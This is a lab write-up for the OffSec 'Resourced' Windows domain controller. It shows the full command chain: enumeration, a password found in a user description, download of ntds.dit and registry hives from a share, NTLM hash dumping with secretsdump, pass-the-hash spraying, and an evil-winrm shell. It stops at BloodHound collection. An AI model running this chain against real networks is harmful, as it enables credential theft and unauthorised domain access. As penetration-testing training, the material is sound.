# Resourced

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Practice
Difficulty: Intermediate
Community Rating: Very Hard
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Windows
Points: 25
Number of Flags: 2
Lab Description:
Domain controller enumeration will reveal remnants of a password audit that will lead to shell access. 
Following this, a Resource-Based Constrained Delegation exploitation vector will be leveraged to 
elevate access to system privileges. This lab focuses on enumeration techniques and privilege escalation 
methods.
```

Machine link: [https://portal.offsec.com/machine/resourced-36043/overview/details](https://portal.offsec.com/machine/resourced-36043/overview/details)

## Solution

**Note**: This machine seems a little unstable and was reverted twice during pwnage.

### Scan for services with nmap

We start by scanning the machine on all TCP-ports with `nmap` including service info and default scripts.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ export TARGET_IP=192.168.101.175

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ sudo nmap -sC -sV -p- $TARGET_IP 
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-12 12:24 +0100
Nmap scan report for 192.168.101.175
Host is up (0.034s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-12 11:26:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-12T11:28:26+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2026-11-11T11:23:39
|_Not valid after:  2027-05-13T11:23:39
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-12T11:27:46+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-12T11:27:48
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 216.74 seconds
```

We have the following TCP-services running and available:

- A Simple [DNS](https://en.wikipedia.org/wiki/Domain_Name_System) Plus server on port 53
- [Kerberos](https://en.wikipedia.org/wiki/Kerberos_(protocol)) on port 88
- [Microsoft Windows RPC](https://en.wikipedia.org/wiki/Microsoft_RPC) on port 135
- [NetBIOS Session Service](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP#Session_service) on port 139
- An [LDAP](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol) server on port 389
- [SMB](https://en.wikipedia.org/wiki/Server_Message_Block) on port 445
- A [Global Catalog](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc728188(v=ws.10)) service on ports 3268
- [Microsoft Terminal Services (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) on port 3389
- A [WinRM](https://en.wikipedia.org/wiki/Windows_Remote_Management) service on port 5985

In short, this is a Windows domain controller for the domain `resourced.local`.

### Update /etc/hosts

For convenience we will update our `/etc/hosts` file with the help of NetExec.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc smb $TARGET_IP --generate-hosts-file hosts.txt
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ cat hosts.txt 
192.168.101.175     RESOURCEDC.resourced.local resourced.local RESOURCEDC

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ sudo vi /etc/hosts

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ tail -n2 /etc/hosts 
192.168.101.175     RESOURCEDC.resourced.local resourced.local RESOURCEDC

```

### Further Enumeration via SMB/RPC/LDAP

Next, we check for shares with NetExec but find none.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc smb $TARGET_IP -u '' -p '' --shares
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.101.175 445    RESOURCEDC       [+] resourced.local\: 
SMB         192.168.101.175 445    RESOURCEDC       [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc smb $TARGET_IP -u Guest -p '' --shares
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\Guest: STATUS_ACCOUNT_DISABLED 
```

Next, we enumerate domain users

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc smb $TARGET_IP -u '' -p '' --users 
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.101.175 445    RESOURCEDC       [+] resourced.local\: 
SMB         192.168.101.175 445    RESOURCEDC       -Username-                    -Last PW Set-       -BadPW- -Description- 
SMB         192.168.101.175 445    RESOURCEDC       Administrator                 2022-02-11 17:21:20 0       Built-in account for administering the computer/domain 
SMB         192.168.101.175 445    RESOURCEDC       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         192.168.101.175 445    RESOURCEDC       krbtgt                        2021-10-01 11:08:53 0       Key Distribution Center Service Account 
SMB         192.168.101.175 445    RESOURCEDC       M.Mason                       2021-10-01 11:14:51 0       Ex IT admin 
SMB         192.168.101.175 445    RESOURCEDC       K.Keen                        2021-10-01 11:14:51 0       Frontend Developer 
SMB         192.168.101.175 445    RESOURCEDC       L.Livingstone                 2021-10-01 11:14:51 0       SysAdmin 
SMB         192.168.101.175 445    RESOURCEDC       J.Johnson                     2021-10-01 11:14:52 0       Networking specialist 
SMB         192.168.101.175 445    RESOURCEDC       V.Ventz                       2021-10-01 11:14:52 0       New-hired, reminder: HotelCalifornia194! 
SMB         192.168.101.175 445    RESOURCEDC       S.Swanson                     2021-10-01 11:14:52 0       Military Vet now cybersecurity specialist 
SMB         192.168.101.175 445    RESOURCEDC       P.Parker                      2021-10-01 11:14:52 0       Backend Developer 
SMB         192.168.101.175 445    RESOURCEDC       R.Robinson                    2021-10-01 11:14:52 0       Database Admin 
SMB         192.168.101.175 445    RESOURCEDC       D.Durant                      2021-10-01 11:14:52 0       Linear Algebra and crypto god 
SMB         192.168.101.175 445    RESOURCEDC       G.Goldberg                    2021-10-01 11:14:52 0       Blockchain expert 
SMB         192.168.101.175 445    RESOURCEDC       [*] Enumerated 13 local users: resourced
```

and find these possible credentials:

- Username: `V.Ventz`
- Password: `HotelCalifornia194!`

Let's use our new credentials to enumerate domain groups.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc ldap $TARGET_IP -u V.Ventz -p 'HotelCalifornia194!' --groups 
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
LDAP        192.168.101.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.101.175 389    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
LDAP        192.168.101.175 389    RESOURCEDC       -Group-                                  -Members- -Description- 
LDAP        192.168.101.175 389    RESOURCEDC       Administrators                           3         Administrators have complete and unrestricted access to the computer/domain
LDAP        192.168.101.175 389    RESOURCEDC       Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications 
LDAP        192.168.101.175 389    RESOURCEDC       Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted 
LDAP        192.168.101.175 389    RESOURCEDC       Print Operators                          0         Members can administer printers installed on domain controllers
LDAP        192.168.101.175 389    RESOURCEDC       Backup Operators                         0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files 
LDAP        192.168.101.175 389    RESOURCEDC       Replicator                               0         Supports file replication in a domain
LDAP        192.168.101.175 389    RESOURCEDC       Remote Desktop Users                     2         Members in this group are granted the right to logon remotely
LDAP        192.168.101.175 389    RESOURCEDC       Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features 
LDAP        192.168.101.175 389    RESOURCEDC       Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely
LDAP        192.168.101.175 389    RESOURCEDC       Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer 
LDAP        192.168.101.175 389    RESOURCEDC       Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine. 
LDAP        192.168.101.175 389    RESOURCEDC       IIS_IUSRS                                1         Built-in group used by Internet Information Services.
LDAP        192.168.101.175 389    RESOURCEDC       Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.
LDAP        192.168.101.175 389    RESOURCEDC       Event Log Readers                        0         Members of this group can read event logs from local machine
LDAP        192.168.101.175 389    RESOURCEDC       Certificate Service DCOM Access          0         Members of this group are allowed to connect to Certification Authorities in the enterprise 
LDAP        192.168.101.175 389    RESOURCEDC       RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group. 
LDAP        192.168.101.175 389    RESOURCEDC       RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group. 
LDAP        192.168.101.175 389    RESOURCEDC       RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group. 
LDAP        192.168.101.175 389    RESOURCEDC       Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V. 
LDAP        192.168.101.175 389    RESOURCEDC       Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer. 
LDAP        192.168.101.175 389    RESOURCEDC       Remote Management Users                  1         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. 
LDAP        192.168.101.175 389    RESOURCEDC       Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica. 
LDAP        192.168.101.175 389    RESOURCEDC       Domain Computers                         0         All workstations and servers joined to the domain
LDAP        192.168.101.175 389    RESOURCEDC       Domain Controllers                       0         All domain controllers in the domain
LDAP        192.168.101.175 389    RESOURCEDC       Schema Admins                            1         Designated administrators of the schema
LDAP        192.168.101.175 389    RESOURCEDC       Enterprise Admins                        1         Designated administrators of the enterprise
LDAP        192.168.101.175 389    RESOURCEDC       Cert Publishers                          0         Members of this group are permitted to publish certificates to the directory
LDAP        192.168.101.175 389    RESOURCEDC       Domain Admins                            1         Designated administrators of the domain
LDAP        192.168.101.175 389    RESOURCEDC       Domain Users                             0         All domain users
LDAP        192.168.101.175 389    RESOURCEDC       Domain Guests                            0         All domain guests
LDAP        192.168.101.175 389    RESOURCEDC       Group Policy Creator Owners              1         Members in this group can modify group policy for the domain
LDAP        192.168.101.175 389    RESOURCEDC       RAS and IAS Servers                      0         Servers in this group can access remote access properties of users
LDAP        192.168.101.175 389    RESOURCEDC       Server Operators                         0         Members can administer domain servers
LDAP        192.168.101.175 389    RESOURCEDC       Account Operators                        0         Members can administer domain user and group accounts
LDAP        192.168.101.175 389    RESOURCEDC       Pre-Windows 2000 Compatible Access       2         A backward compatibility group which allows read access on all users and groups in the domain 
LDAP        192.168.101.175 389    RESOURCEDC       Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest
LDAP        192.168.101.175 389    RESOURCEDC       Windows Authorization Access Group       1         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects 
LDAP        192.168.101.175 389    RESOURCEDC       Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage 
LDAP        192.168.101.175 389    RESOURCEDC       Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain 
LDAP        192.168.101.175 389    RESOURCEDC       Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain 
LDAP        192.168.101.175 389    RESOURCEDC       Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain
LDAP        192.168.101.175 389    RESOURCEDC       Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise
LDAP        192.168.101.175 389    RESOURCEDC       Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.
LDAP        192.168.101.175 389    RESOURCEDC       Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information. 
LDAP        192.168.101.175 389    RESOURCEDC       Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain. 
LDAP        192.168.101.175 389    RESOURCEDC       Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest. 
LDAP        192.168.101.175 389    RESOURCEDC       DnsAdmins                                0         DNS Administrators Group
LDAP        192.168.101.175 389    RESOURCEDC       DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).   

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc ldap $TARGET_IP -u V.Ventz -p 'HotelCalifornia194!' --groups "Remote Desktop Users"
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
LDAP        192.168.101.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.101.175 389    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
LDAP        192.168.101.175 389    RESOURCEDC       Administrator
LDAP        192.168.101.175 389    RESOURCEDC       L.Livingstone

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc ldap $TARGET_IP -u V.Ventz -p 'HotelCalifornia194!' --groups "Remote Management Users"
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
LDAP        192.168.101.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.101.175 389    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
LDAP        192.168.101.175 389    RESOURCEDC       L.Livingstone
```

We also re-check shares:

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc smb $TARGET_IP -u V.Ventz -p 'HotelCalifornia194!' --shares 
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.101.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.101.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.101.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.101.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.101.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.101.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.101.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.101.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.101.175 445    RESOURCEDC       Password Audit  READ 
SMB         192.168.101.175 445    RESOURCEDC       SYSVOL          READ            Logon server share 
```

Let's check what files are available on the non-standard `Password Audit` share.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ smbmap -H $TARGET_IP -u V.Ventz -p 'HotelCalifornia194!' -r "Password Audit" --depth 5

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB 
[*] Established 1 SMB connections(s) and 1 authenticated session(s) 
 
[+] IP: 192.168.101.175:445     Name: RESOURCEDC.resourced.local        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Password Audit                                          READ ONLY
        ./Password Audit
        dr--r--r--                0 Tue Oct  5 10:49:16 2021    .
        dr--r--r--                0 Tue Oct  5 10:49:16 2021    ..
        dr--r--r--                0 Tue Oct  5 10:49:15 2021    Active Directory
        dr--r--r--                0 Tue Oct  5 10:49:16 2021    registry
        ./Password Audit//Active Directory
        dr--r--r--                0 Tue Oct  5 10:49:16 2021    .
        dr--r--r--                0 Tue Oct  5 10:49:16 2021    ..
        fr--r--r--         25165824 Tue Oct  5 10:49:16 2021    ntds.dit
        fr--r--r--            16384 Tue Oct  5 10:49:16 2021    ntds.jfm
        ./Password Audit//registry
        dr--r--r--                0 Tue Oct  5 10:49:16 2021    .
        dr--r--r--                0 Tue Oct  5 10:49:16 2021    ..
        fr--r--r--            65536 Tue Oct  5 10:49:16 2021    SECURITY
        fr--r--r--         16777216 Tue Oct  5 10:49:16 2021    SYSTEM
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections   
```

The files are downloaded for later analysis.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ smbclient "//$TARGET_IP/Password Audit" -U 'V.Ventz%HotelCalifornia194!' -c 'prompt OFF; recurse ON; mget *'
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (2429.9 KiloBytes/sec) (average 2429.9 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (108.1 KiloBytes/sec) (average 2396.4 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (444.4 KiloBytes/sec) (average 2369.4 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (3047.6 KiloBytes/sec) (average 2600.4 KiloBytes/sec)
```

### Extract NTLM hashes

We can parse the files and extract NTLM hashes for the domain with Impacket's secretdump.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ impacket-secretsdump -system registry/SYSTEM -ntds 'Active Directory'/ntds.dit -just-dc-ntlm local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Cleaning up... 

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ impacket-secretsdump -system registry/SYSTEM -ntds 'Active Directory'/ntds.dit -just-dc-ntlm local | grep ':::' | cut -d ':' -f1 > users.txt

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ impacket-secretsdump -system registry/SYSTEM -ntds 'Active Directory'/ntds.dit -just-dc-ntlm local | grep ':::' | cut -d ':' -f4 > hashes.txt
```

### Verify credentials

Next, we verify what hashes are still valid.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc smb $TARGET_IP -u users.txt -H hashes.txt --continue-on-success --no-bruteforce
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
SMB         192.168.101.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f STATUS_LOGON_FAILURE 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\Guest:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_ACCOUNT_DISABLED 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\RESOURCEDC$:9ddb6f4d9d01fedeb4bccfb09df1b39d STATUS_LOGON_FAILURE 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\krbtgt:3004b16f88664fbebfcb9ed272b0565b STATUS_LOGON_FAILURE 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\M.Mason:3105e0f6af52aba8e11d19f27e487e45 STATUS_PASSWORD_EXPIRED 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\K.Keen:204410cc5a7147cd52a04ddae6754b0c STATUS_PASSWORD_EXPIRED 
SMB         192.168.101.175 445    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\J.Johnson:3e028552b946cc4f282b72879f63b726 STATUS_PASSWORD_EXPIRED 
SMB         192.168.101.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\S.Swanson:bd7c11a9021d2708eda561984f3c8939 STATUS_PASSWORD_EXPIRED 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\P.Parker:980910b8fc2e4fe9d482123301dd19fe STATUS_PASSWORD_EXPIRED 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\R.Robinson:fea5a148c14cf51590456b2102b29fac STATUS_PASSWORD_EXPIRED 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\D.Durant:08aca8ed17a9eec9fac4acdcb4652c35 STATUS_PASSWORD_EXPIRED 
SMB         192.168.101.175 445    RESOURCEDC       [-] resourced.local\G.Goldberg:62e16d17c3015c47b4d513e65ca757a2 STATUS_PASSWORD_EXPIRED 
```

Nice, we have another set of credentials:

- Username: `L.Livingstone`
- NTLM Hash: `19a3a7550ce8c505c2d46b5e39d6f808`

### Connect as L.Livingstone

So we can connect as `L.Livingstone` with Evil-WinRM.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ evil-winrm -i $TARGET_IP -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
 
Evil-WinRM shell v3.7
 
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
```

### Get the user flag

The user flag is now available to us.

```bash
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> type ../Desktop/local.txt
f<REDACTED>a
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
```

### BloodHound Data Collection

Next, we collect bloodhound data with NetExec.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/Resourced]
└─$ nxc ldap $TARGET_IP --dns-server $TARGET_IP -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808' --bloodhound -c all
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
LDAP        192.168.101.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.101.175 389    RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 
LDAP        192.168.101.175 389    RESOURCEDC       Resolved collection methods: acl, trusts, dcom, rdp, session, objectprops, container, group, psremote, localadmin
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
<---snip--->
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
/usr/lib/python3/dist-packages/anyio/from_thread.py:119: SyntaxWarning: 'return' in a 'finally' block
  return result
LDAP        192.168.101.175 389    RESOURCEDC       Done in 0M 23S
